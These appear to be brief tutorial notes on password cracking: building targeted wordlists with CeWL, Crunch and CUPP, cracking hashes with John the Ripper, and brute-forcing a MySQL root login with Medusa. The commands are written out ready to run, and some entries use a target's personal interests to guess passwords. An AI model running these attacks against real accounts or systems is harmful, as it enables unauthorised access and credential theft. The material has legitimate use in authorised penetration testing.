# Creat Passwords

# Cewl

A smarter and more efficient approach would be to only harvest the words longer than the typical company password policy, usually eight characters at a minimum. We can accomplish this by using ceWL’s minimum word length option or –m followed by 8. In addition, we can determine the depth of the spidering (how many subdirectories deep to look). This number will depend upon the site, but I think a depth of four subdirectories is sufficient and efficient at capturing most of the keywords

```c
cewl –url <the URL you want to scrape>
cewl –d 4 –m 8 https://www.hackers-arise.com –w cewlpasswords
john –wordlist=/root/cewlpasswords –rules passwordhashes

```

# Crunch

Let’s say we know that the target is a Bob Dylan fan. They might use that name and then append it with four numbers (maybe their birth date). We could create such a list in crunch by entering;

```c
crunch 9 9 -t dylan%%%% -o customwordlist.txt

```

When we hit enter, crunch first calculates how large the file will become before creating it (those of you who are Mr. Robot fans ([www.hackers-arise.com/mr-robot](http://www.hackers-arise.com/mr-robot)) will likely recognize that Elliot cracked his therapist’s password in Season 1 using a similar technique). In this case, crunch estimates it will be 100,000 bytes.

```c
crunch 13 13 –t @@@@dylan%%%% -o customwordlist.txt
```

# Cupp

- Install
    
    `git clone https://github.com/Mebus/cupp`
    
    `cd cupp`
    
    `./cupp.py`
    
    `./cupp -i`
    

# Medusa

`medusa -h`

`medusa -d` 

`medusa –h 192.168.0.114 –u root –P /root/top10000passwords –M mysql`